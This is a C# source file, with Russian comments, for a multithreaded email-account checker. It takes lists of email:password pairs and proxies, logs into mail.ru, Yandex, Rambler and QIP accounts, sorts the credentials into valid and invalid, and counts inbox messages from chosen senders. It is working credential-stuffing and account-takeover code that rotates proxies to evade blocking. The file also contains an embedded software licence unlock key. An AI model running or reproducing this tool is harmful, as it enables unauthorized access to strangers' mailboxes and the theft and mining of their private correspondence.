using System;
using System.Collections.Concurrent;
using System.Threading;
using System.Text.RegularExpressions;
using xNet.Net;
using System.Collections.Generic;
using Chilkat;

//----удаление дубликатов
//-----отключение проверки прокси
//-------сохранение остатка полностью
//-----исправлен чек мейл ру и рамблера и яндекса и квипа
//-------интерфейс при обычном чеке на валид
//-----возможность самому подгружать прокси

//исправить яндекс чек писем
//для яндекса и мейла фразы ошибок другие поставить, мультиязычные

namespace Mail_Checker
{

    class ProxyStats
    {
        public string proxy;
        public int stats;

        public ProxyStats(string proxy, int stats)
        {
            this.proxy = proxy;
            this.stats = stats;
        }
    }


    class Checker
    {

        public event EventHandler<CheckEventArgs> OneCheckDone;

        char[] separs = { ':', ';' };
        public ConcurrentStack<string> mails;
        ConcurrentQueue<ProxyStats> proxys;
        string[] querys;
        bool proxyCheck = true;
        List<Thread> threadsList;


        int workingThreads = 0, errors = 0, valid = 0, novalid = 0;
        int threads, timeout;
        bool started = false;

        public Checker(string[] mails, string[] proxys, string[] querys, int threads, int timeout, bool proxyCheck)
        {
            this.mails = new ConcurrentStack<string>(mails);

            this.proxys = new ConcurrentQueue<ProxyStats>();
            this.proxyCheck = proxyCheck;

            for (int i = 0; i < proxys.Length; i++)
            {
                this.proxys.Enqueue(new ProxyStats(proxys[i], 10));
            }


            this.querys = querys;
            this.threads = threads;
            this.timeout = timeout;

        }

        public void AddProxys(string[] newProxys)
        {

            for (int i = 0; i < newProxys.Length; i++)
            {
                this.proxys.Enqueue(new ProxyStats(newProxys[i], 10));
            }

            while (workingThreads < threads)
            {
                Thread t = new Thread(new ThreadStart(Check));
                t.Start();
                threadsList.Add(t);
            }

        }






        public void Start()
        {
            started = true;

            threadsList = new List<Thread>();


            for (int i = 0; i < threads && i < 1001; i++)
            {
                Thread t = new Thread(new ThreadStart(Check));
                t.Start();
                threadsList.Add(t);
            }
        }

        public void Stop()
        {
            started = false;
        }


        Random r = new Random();

        void Check()
        {

            workingThreads++;

            Thread.Sleep(r.Next(100, 10000));

            while (mails.Count > 0 && proxys.Count > 0 && started)
            {

                string mailLine;

                if (!mails.TryPop(out mailLine)) continue;

                string[] mailElements = mailLine.Split(separs);
                if (mailElements.Length != 2) continue;


                string serv = DetectDomain(mailElements[0]);

                if (serv == "") continue;

                ProxyStats proxyLine;
                if (!proxys.TryDequeue(out proxyLine))
                {
                    mails.Push(mailLine);
                    continue;
                }
                string[] proxyElements = proxyLine.proxy.Split(separs);

                if (proxyElements.Length != 2 || Regex.Matches(proxyElements[0], "((25[0-5]|2[0-4]\\d|[01]?\\d\\d?)\\.){3}(25[0-5]|2[0-4]\\d|[01]?\\d\\d?)").Count == 0 ||
                    Regex.Matches(proxyElements[1], "^[0-9]*$").Count == 0 || Convert.ToInt32(proxyElements[1]) < 0 || Convert.ToInt32(proxyElements[1]) > Int32.MaxValue)
                {
                    mails.Push(mailLine);
                    continue;
                }


                int[] messages = new int[querys.Length];

                CheckErrors error = CheckErrors.noError;

                if (serv == "imap.mail.ru") MailRuCheck(mailElements, proxyElements, out messages, out error);
                else if (serv == "imap.yandex.ru") YandexCheck(mailElements, proxyElements, out messages, out error);
                else if (serv == "imap.rambler.ru") ImapMailsCheck(mailElements, serv, proxyElements, out messages, out error);
                else if (serv == "imap.qip.ru") ImapMailsCheck(mailElements, serv, proxyElements, out messages, out error);
                else
                {
                    proxys.Enqueue(proxyLine);
                    continue;
                }

                if (error == CheckErrors.proxyError)
                {
                    errors++;
                    mails.Push(mailLine);
                    proxyLine.stats--;
                    if (proxyLine.stats > 0 || !proxyCheck) proxys.Enqueue(proxyLine);
                }
                else if (error == CheckErrors.noError)
                {
                    valid++;
                    proxyLine.stats += 10;
                    proxys.Enqueue(proxyLine);
                }
                else if (error == CheckErrors.mailError)
                {
                    novalid++;
                    proxys.Enqueue(proxyLine);
                }
                else if (error == CheckErrors.anotherError)
                {
                    mails.Push(mailLine);
                    proxys.Enqueue(proxyLine);
                }



                MailInfo mInfo = new MailInfo(mailElements[0], mailElements[1], messages);
                CheckState chState = new CheckState(mails.Count + workingThreads - 1, proxys.Count + workingThreads - 1, errors, valid, novalid, workingThreads);
                OneCheckDone(this, new CheckEventArgs(error, mInfo, chState));



            }


            workingThreads--;

        }

        public static string DetectDomain(string mail)
        {
            string serv = "";
            if (mail.Contains("@yandex.ru")) serv = "imap.yandex.ru";

            else if (mail.Contains("@mail.ru") || mail.Contains("@list.ru")
            || mail.Contains("@inbox.ru") || mail.Contains("@bk.ru"))
                serv = "imap.mail.ru";

            else if (mail.Contains("@rambler.ru") || mail.Contains("@lenta.ru") ||
                mail.Contains("@autorambler.ru") || mail.Contains("@myrambler.ru") ||
                mail.Contains("@ro.ru") || mail.Contains("@r0.ru"))
                serv = "imap.rambler.ru";

            else if (mail.Contains("@qip.ru") || mail.Contains("@pochta.ru") ||
                mail.Contains("@fromru.com") || mail.Contains("@front.ru") ||
                mail.Contains("@hotbox.ru") || mail.Contains("@hotmail.ru") ||
                mail.Contains("@krovatka.su") || mail.Contains("@land.ru") ||
                mail.Contains("@mail15.com") || mail.Contains("@mail333.com") ||
                mail.Contains("@newmail.ru") || mail.Contains("@nightmail.ru") ||
                mail.Contains("@nm.ru") || mail.Contains("@pisem.net") ||
                mail.Contains("@pochtamt.ru") || mail.Contains("@pop3.ru") ||
                mail.Contains("@rbcmail.ru") || mail.Contains("@smtp.ru") ||
                mail.Contains("@5ballov.ru") || mail.Contains("@aeterna.ru") ||
                mail.Contains("@ziza.ru") || mail.Contains("@memori.ru") ||
                mail.Contains("@photofile.ru") || mail.Contains("@fotoplenka.ru") ||
                mail.Contains("@pochta.com"))
                serv = "imap.qip.ru";

            else serv = mail.Split(new char[] { '@' })[1];
            return serv;
        }

        private void MailRuCheck(string[] mailElements, string[] proxyElements, out int[] messages, out CheckErrors error)
        {

            string[] loginDomain = mailElements[0].Split(new char[] { '@' });

            messages = new int[querys.Length];
            for (int i = 0; i < messages.Length; i++)
            {
                messages[i] = 0;
            }

            error = CheckErrors.noError;


            try
            {


                HttpProxyClient proxy = new HttpProxyClient(proxyElements[0], Convert.ToInt32(proxyElements[1]));
                CookieDictionary cookies = new CookieDictionary();

                xNet.Net.HttpRequest req1 = new xNet.Net.HttpRequest();
                req1.Proxy = proxy;
                req1.Cookies = cookies;
                req1.ConnectTimeout = timeout * 1000;
                req1.UserAgent = "Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10";

                xNet.Net.HttpResponse res1 = req1.Post("https://auth.mail.ru/cgi-bin/auth",
                    "Login=" + loginDomain[0] + "&Domain=" + loginDomain[1] + "&Password=" + mailElements[1] + "&saveauth=1&new_auth_form=1",
                    "application/x-www-form-urlencoded");

                string res1str = res1.ToString();




                if (res1str.Contains("&captcha=1") || res1str.Contains("Ваш ящик заблокирован")
                    || res1str.Contains("&fail=1") || res1str.Contains("Восстановление доступа к ящику") ||
                    res1str.Contains("мы запретили восстановление пароля с данной версии"))
                {
                    error = CheckErrors.mailError;
                    return;
                }
                else if (!res1str.Contains("m.mail.ru/messages"))
                {
                    error = CheckErrors.proxyError;
                    return;
                }

                xNet.Net.HttpRequest req2 = new xNet.Net.HttpRequest();
                req2.Proxy = proxy;
                req2.Cookies = cookies;
                req2.ConnectTimeout = timeout * 1000;
                req2.UserAgent = "Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10";


                for (int i = 0; i < querys.Length; i++)
                {

                    xNet.Net.HttpResponse res2 = req2.Get("https://m.mail.ru/search/gosearch?q_from=" + querys[i]);

                    string res2str = res2.ToString();

                    if (!res2str.Contains("Почта Mail.Ru"))
                    {
                        error = CheckErrors.proxyError;
                        return;
                    }
                    else if (res2str.Contains("Введите поисковый запрос"))
                    {
                        messages[i] = 0;
                    }
                    else
                    {
                        MatchCollection col = Regex.Matches(res2str, "[0-9]*\\)</option>");

                        for (int ii = 0; ii < col.Count; ii++)
                        {
                            string foundStr = col[ii].Value;
                            foundStr = foundStr.Replace(")</option>", "");

                            messages[i] += Convert.ToInt32(foundStr);
                        }



                    }
                }

            }
            catch (HttpException)
            {
                error = CheckErrors.proxyError;
            }
            catch (ArgumentException)
            {
                error = CheckErrors.proxyError;
            }


        }


        private void YandexCheck(string[] mailElements, string[] proxyElements, out int[] messages, out CheckErrors error)
        {


            messages = new int[querys.Length];
            for (int i = 0; i < messages.Length; i++)
            {
                messages[i] = 0;
            }

            error = CheckErrors.noError;


            try
            {


                HttpProxyClient proxy = new HttpProxyClient(proxyElements[0], Convert.ToInt32(proxyElements[1]));
                CookieDictionary cookies = new CookieDictionary();

                xNet.Net.HttpRequest req1 = new xNet.Net.HttpRequest();
                req1.Proxy = proxy;
                req1.Cookies = cookies;
                req1.ConnectTimeout = timeout * 1000;
                req1.AddParam("login", mailElements[0]);
                req1.AddParam("passwd", mailElements[1]);
                req1.AddParam("retpath", "https://mail.yandex.ru");

                xNet.Net.HttpResponse res1 = req1.Post("https://passport.yandex.ru/passport?mode=auth&from=mail&origin=hostroot_new_l_enter&retpath=https://mail.yandex.ru");

                string res1str = res1.ToString();


                if (res1str.Contains("account_hacked_phone") ||
                    res1str.Contains("восстановление доступа к логину") || res1str.Contains("Ваш логин заблокирован") ||
                    res1str.Contains("domik-error-captcha") || res1str.Contains("account_hacked_no_phone") || 
                    res1str.Contains("Неправильная пара логин-пароль") || res1str.Contains("записи с таким логином не существует"))
                {
                    error = CheckErrors.mailError;
                    return;
                }
                else if (!res1str.Contains("Яндекс.Почта"))
                {
                    error = CheckErrors.proxyError;
                    return;
                }


                for (int i = 0; i < querys.Length; i++)
                {

                    xNet.Net.HttpRequest req2 = new xNet.Net.HttpRequest();
                    req2.Proxy = proxy;
                    req2.Cookies = cookies;
                    req2.ConnectTimeout = timeout * 1000;
                    req2.AddParam("_handlers", "messages");
                    req2.AddParam("search", "yes");
                    req2.AddParam("scope", "hdr_from");
                    req2.AddParam("request", querys[i]);
                    req2.AddParam("_page", "messages");
                    req2.AddParam("_service", "mail");
                    req2.AddParam("_locale", "ru");
                    req2.AddHeader("X-Requested-With", "XMLHttpRequest");

                    xNet.Net.HttpResponse res2 = req2.Post("https://mail.yandex.ru/neo2/handlers/handlers3.jsx?_h=messages");

                    string res2str = res2.ToString();

                    if (!res2str.Contains("handlers"))
                    {
                        error = CheckErrors.proxyError;
                        return;
                    }
                    else if (res2str == "")
                    {
                        throw new NotImplementedException();
                    }
                    else
                    {
                        MatchCollection col = Regex.Matches(res2str, "\"type\":\"from\"");
                        messages[i] = col.Count;

                    }
                }

            }
            catch (HttpException)
            {
                error = CheckErrors.proxyError;
            }
            catch (ArgumentException)
            {
                error = CheckErrors.proxyError;
            }


        }


        private void ImapMailsCheck(string[] mailElements, string serv, string[] proxyElements, out int[] messages, out CheckErrors error)
        {
            bool success = true;
            messages = new int[querys.Length];
            for (int i = 0; i < messages.Length; i++)
            {
                messages[i] = 0;
            }

            error = CheckErrors.noError;


            Imap imap = new Imap();
            imap.ConnectTimeout = timeout;
            imap.ReadTimeout = timeout;
            imap.Ssl = true;
            imap.Port = 993;
            imap.UnlockComponent("1QCDO-156DU-TN61L-13B9N-HQO0G");


            imap.HttpProxyHostname = proxyElements[0];
            imap.HttpProxyPort = Convert.ToInt32(proxyElements[1]);


            success = imap.Connect(serv);
            if (!success) error = CheckErrors.proxyError;

            if (success == true)
            {
                success = imap.Login(mailElements[0], mailElements[1]);

                if (!success)
                {
                    if (imap.LastResponse.Contains("Incorrect username") || imap.LastResponse.Contains("Account blocked")) error = CheckErrors.mailError;
                    else if (imap.LastResponse == "") error = CheckErrors.proxyError;
                    else error = CheckErrors.proxyError;
                }
            }

            if (success == true)
            {
                if (querys.Length > 0)
                {
                    Mailboxes mboxes = null;
                    mboxes = imap.ListMailboxes("", "");
                    if (mboxes == null)
                    {
                        success = false;
                        error = CheckErrors.proxyError;
                    }


                    if (success)
                    {
                        for (int i = 0; i < mboxes.Count; i++)
                        {
                            string mboxName = mboxes.GetName(i);
                            if (mboxName == "DraftBox" || mboxName == "SentBox" || mboxName == "Spam" || mboxName == "Draft" || mboxName == "Sent") continue;

                            success = imap.SelectMailbox(mboxName);
                            if (!success)
                            {
                                error = CheckErrors.proxyError;
                                break;
                            }


                            for (int k = 0; k < querys.Length; k++)
                            {
                                MessageSet messageSet = imap.Search("FROM " + querys[k], false);
                                if (messageSet == null)
                                {
                                    success = false;
                                    error = CheckErrors.proxyError;
                                    i = mboxes.Count + 1; //выход из внешнего цикла
                                    break;
                                }

                                messages[k] += messageSet.Count;
                            }

                        }
                    }



                }


            }


            imap.Disconnect();
            imap.Dispose();

        }



    }
}
